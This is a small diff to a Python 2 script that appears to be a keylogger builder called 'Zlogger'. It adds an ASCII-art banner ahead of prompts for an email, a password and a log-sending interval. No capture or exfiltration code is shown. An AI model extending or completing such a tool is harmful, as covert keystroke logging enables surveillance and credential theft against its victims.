@@ -3,6 +3,18 @@
 from subprocess import call
 from shutil import copyfile
 
+HEADER = """
+__________  .__                                     
+\____    /  |  |   ____   ____   ____   ___________ 
+  /     /   |  |  /  _ \ / ___\ / ___\_/ __ \_  __ \\
+ /     /_   |  |_(  <_> ) /_/  > /_/  >  ___/|  | \/
+/_______ \  |____/\____/\___  /\___  / \___  >__|   
+        \/             /_____//_____/      \/       
+
+ \n"""
+
+print(HEADER)
+
 email = raw_input("Email : ")
 password = raw_input("password : ")
 sleep_interval = raw_input("Send logs every (seconds) : ")
